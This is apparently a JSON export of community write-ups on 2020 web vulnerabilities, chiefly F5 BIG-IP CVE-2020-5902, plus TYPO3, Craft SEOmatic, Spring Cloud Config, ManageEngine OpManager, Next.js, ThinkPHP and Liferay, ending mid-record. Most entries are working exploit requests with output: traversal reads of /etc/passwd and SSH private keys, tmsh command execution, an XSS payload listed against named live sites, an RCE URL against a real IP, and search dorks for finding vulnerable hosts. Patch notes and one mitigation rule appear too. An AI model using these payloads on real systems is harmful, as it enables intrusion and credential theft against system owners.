      "document": "# Overview\r\n\r\nThis one is Critical to patch quickly with a CVSS Score of 10. \r\n\r\nIf an attacker can gain access to the TMUI Configuration utility port they can gain unauthenticated Remote Code Execution. All version of Big IP from 11.x through 15.x are vulnerable. \r\n\r\n# Patch & Mitigation\r\n\r\nPatches are out but F5 have also listed a set of Mitigation techniques to reduce the attack surface. This takes it from Unathenticated RCE to Authenticated RCE, Which is still bad. \r\n\r\nRefer to the F5 Article for details. - https://support.f5.com/csp/article/K52145254\r\n\r\n# Cloud Services\r\n\r\nIf you are using AWS, Azure, GCP cloud images Check the version number is fully patched against the correct version numbers. \r\n- At the time of Writing AWS MarketPlace version is `15.1.0.2-0.0.9`\r\n\r\n# In the wild POC\r\nWithin 24 hours this has been exploited in the wild with simple to replicate Proof Of Concepts. \r\n\r\n\r\n# Core Vulnerability. \r\n\r\nThe core of this vulnerability lies in a path traversal that leads to auth bypass. With this you can use built in functions to gain file read / write or you can access the web based shell to create accounts with shell access. \r\n\r\nHere are some redacted examples. The redaction will be removed once more details are public. \r\nEnough information is now public that I am removing the redaction. The following examples show:\r\n\r\n- File read\r\n- File Write\r\n- tmsh access\r\n\r\n```\r\ncurl --insecure  'https://f5-bigip.home.lab:8443/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'\r\n\r\n\r\n{\"output\":\"root:x:0:0:root:\\/root:\\/sbin\\/nologin\\nbin:x:1:1:bin:\\/bin:\\/sbin\\/nologin\\ndaemon:x:2:2:daemon:\\/sbin:\\/sbin\\/nologin\\nadm:x:3:4:adm:\\/var\\/adm:\\/sbin\\/nologin\\nlp:x:4:7:lp:\\/var\\/spool\\/lpd:\\/sbin\\/nologin\\nmail:x:8:12:mail:\\/var\\/spool\\/mail:\\/sbin\\/nologin\\noperator:x:11:0:operator:\\/root:\\/sbin\\/nologin\\nnobody:x:99:99:Nobody:\\/:\\/sbin\\/nologin\\ntmshnobody:x:32765:32765:tmshnobody:\\/:\\/sbin\\/nologin\\nadmin:x:0:500:Admin User:\\/home\\/admin:\\/bin\\/bash\\nvcsa:x:69:69:virtual console memory owner:\\/dev:\\/sbin\\/nologin\\ndbus:x:81:81:System message bus:\\/:\\/sbin\\/nologin\\nsystemd-bus-proxy:x:974:998:systemd Bus Proxy:\\/:\\/sbin\\/nologin\\nsystemd-network:x:192:192:systemd Network Management:\\/:\\/sbin\\/nologin\\npolkitd:x:27:27:User for polkitd:\\/:\\/sbin\\/nologin\\nnslcd:x:65:55:LDAP Client User:\\/:\\/sbin\\/nologin\\ntss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:\\/dev\\/null:\\/sbin\\/nologin\\npostgres:x:26:26:PostgreSQL Server:\\/var\\/local\\/pgsql\\/data:\\/sbin\\/nologin\\ntomcat:x:91:91:Apache Tomcat:\\/usr\\/share\\/tomcat:\\/sbin\\/nologin\\nhsqldb:x:96:96::\\/var\\/lib\\/hsqldb:\\/sbin\\/nologin\\nsshd:x:74:74:Privilege-separated SSH:\\/var\\/empty\\/sshd:\\/sbin\\/nologin\\nrpc:x:32:32:Rpcbind Daemon:\\/var\\/lib\\/rpcbind:\\/sbin\\/nologin\\nntp:x:38:38::\\/etc\\/ntp:\\/sbin\\/nologin\\nf5_remoteuser:x:499:499:f5 remote user account:\\/home\\/f5_remoteuser:\\/sbin\\/nologin\\ntcpdump:x:72:72::\\/:\\/sbin\\/nologin\\noprofile:x:16:16:Special user account to be used by OProfile:\\/:\\/sbin\\/nologin\\nsdm:x:191:996:sdmuser:\\/var\\/sdm:\\/bin\\/false\\nnamed:x:25:25:Named:\\/var\\/named:\\/bin\\/false\\napache:x:48:48:Apache:\\/usr\\/local\\/www:\\/sbin\\/nologin\\nsyscheck:x:199:10::\\/:\\/sbin\\/nologin\\nmysql:x:98:98:MySQL server:\\/var\\/lib\\/mysql:\\/sbin\\/nologin\\nrestnoded:x:198:198::\\/:\\/sbin\\/nologin\\nGuest:x:16110:500:Guest:\\/home\\/Guest:\\/sbin\\/nologin\\n\"}%           \r\n```\r\n\r\nThis doesn't only affect the login.jsp path it can be used from anywhere. \r\n\r\n```\r\ncurl --insecure  'https://f5-bigip.home.lab:8443/tmui/tmui/login/welcome.jsp/..;/..;/locallb/workspace/fileRead.jsp?fileName=/etc/passwd' \r\n\r\n\r\n{\"output\":\"root:x:0:0:root:\\/root:\\/sbin\\/nologin\\nbin:x:1:1:bin:\\/bin:\\/sbin\\/nologin\\ndaemon:x:2:2:daemon:\\/sbin:\\/sbin\\/nologin\\nadm:x:3:4:adm:\\/var\\/adm:\\/sbin\\/nologin\\nlp:x:4:7:lp:\\/var\\/spool\\/lpd:\\/sbin\\/nologin\\nmail:x:8:12:mail:\\/var\\/spool\\/mail:\\/sbin\\/nologin\\noperator:x:11:0:operator:\\/root:\\/sbin\\/nologin\\nnobody:x:99:99:Nobody:\\/:\\/sbin\\/nologin\\ntmshnobody:x:32765:32765:tmshnobody:\\/:\\/sbin\\/nologin\\nadmin:x:0:500:Admin User:\\/home\\/admin:\\/bin\\/bash\\nvcsa:x:69:69:virtual console memory owner:\\/dev:\\/sbin\\/nologin\\ndbus:x:81:81:System message bus:\\/:\\/sbin\\/nologin\\nsystemd-bus-proxy:x:974:998:systemd Bus Proxy:\\/:\\/sbin\\/nologin\\nsystemd-network:x:192:192:systemd Network Management:\\/:\\/sbin\\/nologin\\npolkitd:x:27:27:User for polkitd:\\/:\\/sbin\\/nologin\\nnslcd:x:65:55:LDAP Client User:\\/:\\/sbin\\/nologin\\ntss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:\\/dev\\/null:\\/sbin\\/nologin\\npostgres:x:26:26:PostgreSQL Server:\\/var\\/local\\/pgsql\\/data:\\/sbin\\/nologin\\ntomcat:x:91:91:Apache Tomcat:\\/usr\\/share\\/tomcat:\\/sbin\\/nologin\\nhsqldb:x:96:96::\\/var\\/lib\\/hsqldb:\\/sbin\\/nologin\\nsshd:x:74:74:Privilege-separated SSH:\\/var\\/empty\\/sshd:\\/sbin\\/nologin\\nrpc:x:32:32:Rpcbind Daemon:\\/var\\/lib\\/rpcbind:\\/sbin\\/nologin\\nntp:x:38:38::\\/etc\\/ntp:\\/sbin\\/nologin\\nf5_remoteuser:x:499:499:f5 remote user account:\\/home\\/f5_remoteuser:\\/sbin\\/nologin\\ntcpdump:x:72:72::\\/:\\/sbin\\/nologin\\noprofile:x:16:16:Special user account to be used by OProfile:\\/:\\/sbin\\/nologin\\nsdm:x:191:996:sdmuser:\\/var\\/sdm:\\/bin\\/false\\nnamed:x:25:25:Named:\\/var\\/named:\\/bin\\/false\\napache:x:48:48:Apache:\\/usr\\/local\\/www:\\/sbin\\/nologin\\nsyscheck:x:199:10::\\/:\\/sbin\\/nologin\\nmysql:x:98:98:MySQL server:\\/var\\/lib\\/mysql:\\/sbin\\/nologin\\nrestnoded:x:198:198::\\/:\\/sbin\\/nologin\\nGuest:x:16110:500:Guest:\\/home\\/Guest:\\/sbin\\/nologin\\n\"}\r\n```\r\n\r\n```\r\ncurl --insecure  'https://f5-bigip.home.lab:8443/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'\r\n```\r\n\r\n\r\n",
      "score": 6,
      "metadata": {
        "tags": [
          "common_enterprise",
          "easy_to_develop",
          "high_privilege_access",
          "exploited_in_the_wild",
          "pre_auth",
          "default_configuration"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "5bd8a79c-e7c0-4895-9076-cff60705b3a5",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "e88b8795-0434-4ac5-b3d5-7e3dab8a60c1",
      "created": "2020-07-04T22:41:59.477686Z",
      "revisionDate": "2021-06-11T21:34:04.191426Z",
      "document": "There have been several reports of exploitation in the wild as of July 4. The one I've seen cited the most is [here](https://twitter.com/buffaloverflow/status/1279384540847489024). ",
      "score": 4,
      "metadata": {
        "tags": [
          "common_enterprise",
          "exploited_in_the_wild"
        ],
        "attacker-value": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        }
      ]
    },
    {
      "id": "b9147b2a-e477-4d74-868e-7085b97c91d7",
      "editorId": "1653ed71-2842-4eb4-9a31-4ffe808a393f",
      "topicId": "e88b8795-0434-4ac5-b3d5-7e3dab8a60c1",
      "created": "2020-07-05T13:21:16.942328Z",
      "revisionDate": "2021-06-11T21:34:26.415975Z",
      "document": "__CVE-2020-5902__\r\n\r\nIn BIG-IP versions 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1, the Traffic Management User Interface (TMUI), also referred to as the Configuration utility, has a Remote Code Execution (RCE) vulnerability in undisclosed pages.\r\n\r\n```\r\n /tmui/login.jsp/..;/tmui/system/user/authproperties.jsp\r\n\r\n/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=jaffa\r\n\r\n/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd\r\n\r\n/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'\r\n```\r\n__Patch & Mitigation:-__\r\n```\r\n<LocationMatch \".*\\.\\.;.*\">\r\nRedirect 404 /\r\n</LocationMatch>\r\n```\r\n__Versions Effected__\r\n- BIG-IP 15.x: 15.1.0/15.0.0\r\n- BIG-IP 14.x: 14.1.0 ~ 14.1.2\r\n- BIG-IP 13.x: 13.1.0 ~ 13.1.3\r\n- BIG-IP 12.x: 12.1.0 ~ 12.1.5\r\n- BIG-IP 11.x: 11.6.1 ~ 11.6.5\r\n\r\n__Dorks__\r\nhttps://beta.shodan.io/search?query=vuln%3Acve-2020-5902\r\n\r\nhttps://www.shodan.io/search?query=http.favicon.hash%3A-335242539+%223992%22",
      "score": 6,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "common_enterprise",
          "default_configuration",
          "easy_to_develop",
          "pre_auth",
          "exploited_in_the_wild"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a8934613-0071-44e9-acaa-b5f5cae3a7fd",
      "editorId": "1653ed71-2842-4eb4-9a31-4ffe808a393f",
      "topicId": "365bb4fc-f46d-4a77-b71f-b0ce87e8f26a",
      "created": "2020-07-05T13:27:47.839822Z",
      "revisionDate": "2020-07-05T13:27:47.847457Z",
      "document": "__DESCRIPTION__-\r\n\r\nTYPO3 6.2.0 to 6.2.38 ELTS and TYPO3 7.0.0 to 7.1.0 (CVE-2020-8091). These versions embed a third-party component named SVG Web which provides svg.swf, a Flash file vulnerable to cross-site scripting.\r\n\r\n__Google Dork__\r\n\r\n`inurl:\"typo3/contrib/websvg\"`\r\n\r\n_Works on IE_\r\n\r\n__PROOF OF CONCEPT__-\r\nPayload: `svg.swf?uniqueId=%22])}catch(e){if(!this.x)alert(\"XSS\"),this.x=1}//`\r\n\r\n__Live sites:__\r\n```\r\nhttps://www.bulac.fr/typo3/contrib/websvg/svg.swf?uniqueId=%22])}catch(e){if(!this.x)alert(%22XSS%22),this.x=1}//\r\n\r\nwww.roz.si/typo3/contrib/websvg/svg.swf?uniqueId=%22])}catch(e){if(!this.x)alert(%22XSS%22),this.x=1}//\r\n\r\nwww.urbanek-consulting.com/typo3/contrib/websvg/svg.swf?uniqueId=%22])}catch(e){if(!this.x)alert(%22XSS%22),this.x=1}//\r\n```",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "pre_auth"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "76be4ab0-d6e1-4887-8b08-55d776ac0d39",
      "editorId": "1653ed71-2842-4eb4-9a31-4ffe808a393f",
      "topicId": "732a42fd-8fc3-4175-8b97-ab415ee45a44",
      "created": "2020-07-05T13:31:46.060044Z",
      "revisionDate": "2020-07-05T13:31:46.061787Z",
      "document": "__Description__-\r\n\r\nThe SEOmatic component before 3.3.0 for Craft CMS allows Server-Side Template Injection that leads to RCE via malformed data to the metacontainers controller.\r\n\r\n__POC__-\r\n\r\n```\r\nHTTP://localhost/actions/seomatic/meta-container/meta-link-container/?uri={{7+'7'}}\r\nHTTP://localhost/actions/seomatic/meta-container/all-meta-containers?uri={{7+'7'}}\r\n```",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "easy_to_develop",
          "default_configuration",
          "pre_auth",
          "exploited_in_the_wild"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "0f8c8ca6-2218-4e17-8936-b6627e90b11a",
      "editorId": "1653ed71-2842-4eb4-9a31-4ffe808a393f",
      "topicId": "770521dd-d057-4195-a187-66787a667266",
      "created": "2020-07-05T13:42:56.17912Z",
      "revisionDate": "2020-07-05T13:42:56.181469Z",
      "document": "Directory Traversal with spring-cloud-config-server\r\n\r\n__DESCRIPTION__\r\n\r\nSpring Cloud Config, 2.2.x versions before 2.2.3, 2.1.x versions before 2.1.9, and older unsupported versions allow applications to provide arbitrary configuration files through the spring-cloud-config-server module. Malicious users or attackers can use specially crafted URLs to send requests, which may lead to directory traversal attacks.\r\n\r\n__PROOF OF CONCEPT__\r\n```\r\nhttp://127.0.0.1:8889/flag.txt%23/222/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29tmp%28_%29\r\n\r\nhttp://127.0.0.1:8889/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Fflag.txt%23/222/11\r\n\r\nhttp://127.0.0.1:8889/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23/222/11\r\n```\r\n\r\n__Video POC__\r\n\r\nhttps://video.twimg.com/tweet_video/Eah0d6rVAAApHM_.mp4",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "5e53f0b6-270d-4c27-ac26-a08501ec22ce",
      "editorId": "1653ed71-2842-4eb4-9a31-4ffe808a393f",
      "topicId": "3a4ed4f4-813a-496d-b9e4-2fab85d16287",
      "created": "2020-07-05T13:47:32.64431Z",
      "revisionDate": "2020-07-10T19:32:24.374953Z",
      "document": "Unauthenticated arbitrary file read on ManageEngine OpMange\r\n\r\n__DESCRIPTION__\r\n\r\nThe latest release of OpManger contains a directory traversal vulnerability that allows unrestricted access to every file in the OpManager application. This includes private SSH keys, password protected Java keystores, and configuration files containing passwords to keystores, private certificates, and the backend database. If LDAP is configured then domain credentials can be obtained from \"conf/OpManager/ldap.conf\".\r\n\r\n__PROOF OF CONCEPT__\r\n_REQUEST:_\r\n```\r\nGET /cachestart/125116/cacheend/apiclient/fluidicv2/javascript/jquery/../../../../bin/.ssh_host_rsa_key HTTP/1.1\r\nHost: <HOSTNAME>:8060\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\nConnection: close\r\nCache-Control: max-age=0\r\nReferer: http://<HOSTNAME>:8060/\r\n```\r\n_RESPONSE:_\r\n```\r\nHTTP/1.1 200 \r\nSet-Cookie: JSESSIONID=4E221B342BC080BC9AC2D19378364E3B; Path=/; HttpOnly\r\nX-FRAME-OPTIONS: DENY\r\nAccept-Ranges: bytes\r\nETag: W/\"902-1586033949624\"\r\nLast-Modified: Sat, 04 Apr 2020 20:59:09 GMT\r\nVary: Accept-Encoding\r\nDate: Mon, 13 Apr 2020 15:40:01 GMT\r\nConnection: close\r\nContent-Length: 902\r\n\r\n-----BEGIN RSA PRIVATE KEY-----\r\nMIICX...pXqnO\r\n-----END RSA PRIVATE KEY-----\r\n```\r\n\r\nHere are the files you can read\r\n```\r\n                \"bin/.ssh_host_dsa_key\",\r\n\t\t\"bin/.ssh_host_dsa_key.pub\",\r\n\t\t\"bin/.ssh_host_rsa_key\",\r\n\t\t\"bin/.ssh_host_rsa_key.pub\",\r\n\t\t\"conf/client.keystore\",\r\n\t\t\"conf/customer-config.xml\",\r\n\t\t\"conf/database_params.conf\",\r\n\t\t\"conf/FirewallAnalyzer/aaa_auth-conf.xml\",\r\n\t\t\"conf/FirewallAnalyzer/auth-conf_ppm.xml\",\r\n\t\t\"conf/gateway.conf\",\r\n\t\t\"conf/itom.truststore\",\r\n\t\t\"conf/netflow/auth-conf.xml\",\r\n\t\t\"conf/netflow/server.xml\",\r\n\t\t\"conf/netflow/ssl_server.xml\",\r\n\t\t\"conf/NFAEE/cs_server.xml\",\r\n\t\t\"conf/OpManager/database_params.conf\",\r\n\t\t\"conf/OpManager/database_params_DE.conf\",\r\n\t\t\"conf/OpManager/ldap.conf\",\r\n\t\t\"conf/OpManager/MicrosoftSQL/database_params.conf\",\r\n\t\t\"conf/OpManager/POSTGRESQL/database_params.conf\",\r\n\t\t\"conf/OpManager/POSTGRESQL/database_params_DE.conf\",\r\n\t\t\"conf/OpManager/securitydbData.xml\",\r\n\t\t\"conf/OpManager/SnmpDefaultProperties.xml\",\r\n\t\t\"conf/Oputils/snmp/Community.xml\",\r\n\t\t\"conf/Persistence/DBconfig.xml\",\r\n\t\t\"conf/Persistence/persistence-configurations.xml\",\r\n\t\t\"conf/pmp/PMP_API.conf\",\r\n\t\t\"conf/pmp/pmp_server_cert.p12\",\r\n\t\t\"conf/product-config.xml\",\r\n\t\t\"conf/SANSeed.xml\",\r\n\t\t\"conf/server.keystore\",\r\n\t\t\"conf/server.xml\",\r\n\t\t\"conf/system_properties.conf\",\r\n\t\t\"conf/tomcat-users.xml\",\r\n\t\t\"lib/OPM_APNS_Cert.p12\"\r\n```\r\n",
      "score": 3,
      "metadata": {
        "tags": [
          "common_enterprise",
          "exploited_in_the_wild",
          "default_configuration",
          "easy_to_develop",
          "pre_auth"
        ]
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "aabda292-46cc-481e-bea9-6b994cece698",
      "editorId": "1653ed71-2842-4eb4-9a31-4ffe808a393f",
      "topicId": "76146707-075d-4fe5-b99f-810f0f8b3d52",
      "created": "2020-07-05T13:51:39.785849Z",
      "revisionDate": "2020-07-05T13:51:39.792712Z",
      "document": "__Next.js__ Path traversal\r\n\r\n__DESCRIPTION__\r\n\r\nNext.js versions before 9.3.2 have a directory traversal vulnerability. Attackers could craft special requests to access files in the dist directory (.next). This does not affect files outside of the dist directory (.next). In general, the dist directory only holds build assets unless your application intentionally stores other assets under this directory. This issue is fixed in version 9.3.2.\r\n\r\n__PROOF OF CONCEPT__\r\n\r\n```\r\nHTTP://localhost/_next/static/../server/pages-manifest.json\r\n```\r\n",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "pre_auth",
          "common_enterprise"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "9740a30f-0e18-4a8b-9124-c7294dd3255b",
      "editorId": "1653ed71-2842-4eb4-9a31-4ffe808a393f",
      "topicId": "ea640ecf-7004-4162-ac75-c0bb62190e7f",
      "created": "2020-07-05T13:53:08.210361Z",
      "revisionDate": "2020-07-10T13:50:56.646429Z",
      "document": "__ThinkPHP RCE__\r\n\r\n__DESCRIPTION__\r\n\r\nThinkPHP before 3.2.4, as used in Open Source BMS v1.1.1 and other products, allows Remote Command Execution via public//?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]= followed by the command.\r\n\r\n__PROOF OF CONCEPT__\r\nThe RCE(Remote Command Execution) vulnerability is triggered by a http request.Successfully executed the command \"whoami\".\r\npoc:\r\n```\r\nhttp://58.82.XXX.XXX:8080/public//?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami\r\n```",
      "score": 2,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "default_configuration",
          "pre_auth",
          "high_privilege_access",
          "common_enterprise"
        ]
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "fe45b442-bf66-4501-a528-2c80a5e73613",
      "editorId": "1653ed71-2842-4eb4-9a31-4ffe808a393f",
      "topicId": "3b64b132-1e7a-49bb-a187-96db3b84bd2a",
      "created": "2020-07-05T13:58:10.085781Z",
      "revisionDate": "2023-11-29T10:44:50.07319Z",
      "document": "__Google dork:-__ `inurl:/api/jsonws`\r\n\r\n__Shodan:-__ `Powered+By+Liferay`\r\n\r\n__publicwww:-__`https://publicwww.com/websites/Powered+By+Liferay/`\r\n\r\n__POC:-__ \r\nhttps://github.com/mzer0one/CVE-2020-7961-POC",
      "score": 3,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "common_enterprise",
          "exploited_in_the_wild",
          "default_configuration",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        },
        {
